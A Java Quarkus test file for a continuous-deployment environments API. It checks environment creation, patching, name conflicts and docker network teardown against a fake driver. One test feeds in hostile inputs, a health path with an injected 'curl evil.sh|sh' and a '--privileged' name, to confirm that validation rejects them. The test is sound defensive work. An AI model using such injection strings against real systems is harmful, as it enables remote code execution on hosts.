package eu.wohlben.qits.cd.api;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.notNullValue;
import static org.hamcrest.Matchers.nullValue;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.cd.control.FakeDeploymentDriver;
import io.quarkus.test.junit.QuarkusTest;
import io.restassured.http.ContentType;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/**
 * The environment surface end to end (against {@link FakeDeploymentDriver} — no docker): creation
 * with the conventions filled in, the reads, teardown, and the validation the surface owes an
 * attacker-reachable machine API. Tests address the absolute {@code /cd/api} paths, which is what
 * makes them catch a prefix regression.
 */
@QuarkusTest
public class CdEnvironmentApiTest {

  @jakarta.inject.Inject FakeDeploymentDriver driver;

  @BeforeEach
  void reset() {
    driver.reset();
  }

  @Test
  public void creationFillsTheConventionsAndEnsuresTheNetwork() {
    given()
        .contentType(ContentType.JSON)
        .body(
            Map.of(
                "name", "env-conventions",
                "applications",
                    List.of(Map.of("repoId", "repo-conventions", "name", "app-conventions"))))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(201)
        .body("environment.name", equalTo("env-conventions"))
        .body("environment.branch", equalTo("environment/env-conventions"))
        .body("environment.network", equalTo("qits-env-env-conventions"))
        .body("environment.applications", hasSize(1))
        .body("environment.applications[0].repoId", equalTo("repo-conventions"))
        .body("environment.applications[0].healthPath", nullValue())
        .body("environment.id", notNullValue());

    assertTrue(
        driver.ensuredNetworks().contains("qits-env-env-conventions"),
        "creation must ensure the environment's network");
  }

  @Test
  public void explicitBranchNetworkAndHealthPathWin() {
    given()
        .contentType(ContentType.JSON)
        .body(
            Map.of(
                "name", "env-explicit",
                "branch", "main",
                "network", "custom-net",
                "applications",
                    List.of(
                        Map.of(
                            "repoId", "repo-explicit",
                            "name", "app-explicit",
                            "healthPath", "/healthz"))))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(201)
        .body("environment.branch", equalTo("main"))
        .body("environment.network", equalTo("custom-net"))
        .body("environment.applications[0].healthPath", equalTo("/healthz"));
  }

  @Test
  public void aDuplicateNameIsAConflict() {
    Map<String, Object> payload =
        Map.of("name", "env-duplicate", "applications", List.of());
    given().contentType(ContentType.JSON).body(payload).when().post("/cd/api/environments")
        .then().statusCode(201);
    given().contentType(ContentType.JSON).body(payload).when().post("/cd/api/environments")
        .then().statusCode(409);
  }

  @Test
  public void hostileNamesAreRejectedBeforeTheyReachAnArgv() {
    // The name becomes a docker network name, an alias and an image path segment; the health path
    // lands inside the container's --health-cmd shell string. None of these may pass validation.
    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "Evil Name", "applications", List.of()))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(400);

    given()
        .contentType(ContentType.JSON)
        .body(
            Map.of(
                "name", "env-hostile-app",
                "applications", List.of(Map.of("repoId", "repo-x", "name", "--privileged"))))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(400);

    given()
        .contentType(ContentType.JSON)
        .body(
            Map.of(
                "name", "env-hostile-health",
                "applications",
                    List.of(
                        Map.of(
                            "repoId", "repo-x",
                            "name", "app-x",
                            "healthPath", "/ok; curl evil.sh|sh"))))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(400);
  }

  @Test
  public void applicationsAreOptionalOnCreate() {
    // The shape every caller should send now: a tier is created, and what it holds is derived from
    // each repository's own deployments.yml on the next green build.
    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-bare"))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(201)
        .body("environment.branch", equalTo("environment/env-bare"))
        .body("environment.applications", hasSize(0));
  }

  @Test
  public void patchRenamesAndRetargetsWithoutTouchingDocker() {
    String environmentId =
        given()
            .contentType(ContentType.JSON)
            .body(Map.of("name", "env-patch"))
            .when()
            .post("/cd/api/environments")
            .then()
            .statusCode(201)
            .extract()
            .path("environment.id");
    driver.reset();

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-patched", "branch", "environment/env-patched"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(200)
        .body("environment.name", equalTo("env-patched"))
        .body("environment.branch", equalTo("environment/env-patched"))
        // The bundle network is NOT renamed with it: the rename is a row change, and the running
        // containers keep the networks they are on until their own next deploy.
        .body("environment.network", equalTo("qits-env-env-patch"));

    // This is the migration path onto the branch convention, so it must be safe on a live tier:
    // nothing was ensured, removed, disconnected or reaped.
    assertTrue(driver.calls().isEmpty(), "PATCH has no docker side effects: " + driver.calls());
    assertTrue(driver.removedEnvironments().isEmpty());
  }

  @Test
  public void patchLeavesAnOmittedFieldAloneAndRejectsWhatCreateWouldReject() {
    String environmentId =
        given()
            .contentType(ContentType.JSON)
            .body(Map.of("name", "env-patch-partial"))
            .when()
            .post("/cd/api/environments")
            .then()
            .statusCode(201)
            .extract()
            .path("environment.id");

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("branch", "environment/dev"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(200)
        .body("environment.name", equalTo("env-patch-partial"))
        .body("environment.branch", equalTo("environment/dev"));

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "Evil Name"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(400);

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("branch", "bad//branch"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(400);

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-patch-partial"))
        .when()
        .patch("/cd/api/environments/no-such-environment")
        .then()
        .statusCode(404);
  }

  @Test
  public void renamingOntoATakenNameIsAConflict() {
    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-patch-taken"))
        .when()
        .post("/cd/api/environments")
        .then()
        .statusCode(201);
    String environmentId =
        given()
            .contentType(ContentType.JSON)
            .body(Map.of("name", "env-patch-other"))
            .when()
            .post("/cd/api/environments")
            .then()
            .statusCode(201)
            .extract()
            .path("environment.id");

    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-patch-taken"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(409);

    // Renaming an environment to the name it already has is not a conflict with itself.
    given()
        .contentType(ContentType.JSON)
        .body(Map.of("name", "env-patch-other"))
        .when()
        .patch("/cd/api/environments/" + environmentId)
        .then()
        .statusCode(200);
  }

  @Test
  public void teardownFreesTheSingletonsBeforeRemovingTheDerivedNetworks() {
    String environmentId =
        given()
            .contentType(ContentType.JSON)
            .body(Map.of("name", "env-derived-teardown"))
            .when()
            .post("/cd/api/environments")
            .then()
            .statusCode(201)
            .extract()
            .path("environment.id");
    driver.scriptExistingNetwork(
        new eu.wohlben.qits.cd.control.DeploymentDriver.Network(
            "qits-env-env-derived-teardown-app-x",
            environmentId,
            eu.wohlben.qits.cd.control.DeploymentDriver.NetworkKind.APPLICATION,
            "app-x"));
    driver.scriptSingletonContainers(
        List.of(new eu.wohlben.qits.cd.control.DeploymentDriver.Endpoint("idp-id", "qits-idp")));

    given().when().delete("/cd/api/environments/" + environmentId).then().statusCode(204);

    // A singleton survives the tier it merely served, so it is what holds the networks open —
    // docker refuses to remove a network with an endpoint on it.
    assertTrue(
        driver.disconnections().contains("qits-env-env-derived-teardown-app-x:idp-id"),
        "singletons leave the derived networks first: " + driver.disconnections());
    assertTrue(driver.removedNetworks().contains("qits-env-env-derived-teardown"));
    assertTrue(
        driver.removedNetworks().contains("qits-env-env-derived-teardown-app-x"),
        "the derived per-application networks go too: " + driver.removedNetworks());
  }

  @Test
  public void teardownRemovesRowsContainersAndNetwork() {
    String environmentId =
        given()
            .contentType(ContentType.JSON)
            .body(
                Map.of(
                    "name", "env-teardown",
                    "applications", List.of(Map.of("repoId", "repo-teardown", "name", "app-teardown"))))
            .when()
            .post("/cd/api/environments")
            .then()
            .statusCode(201)
            .extract()
            .path("environment.id");

    given().when().delete("/cd/api/environments/" + environmentId).then().statusCode(204);
    given().when().get("/cd/api/environments/" + environmentId).then().statusCode(404);

    assertTrue(
        driver.removedEnvironments().contains(environmentId),
        "teardown must remove the environment's containers");
    assertTrue(
        driver.removedNetworks().contains("qits-env-env-teardown"),
        "teardown must remove the environment's network");
  }

  @Test
  public void deletingAMissingEnvironmentIs404() {
    given().when().delete("/cd/api/environments/no-such-environment").then().statusCode(404);
  }

  @Test
  public void deploymentsListingRequiresAnExistingEnvironment() {
    given().when().get("/cd/api/deployments").then().statusCode(400);
    given().when().get("/cd/api/deployments?environmentId=no-such").then().statusCode(404);
  }
}
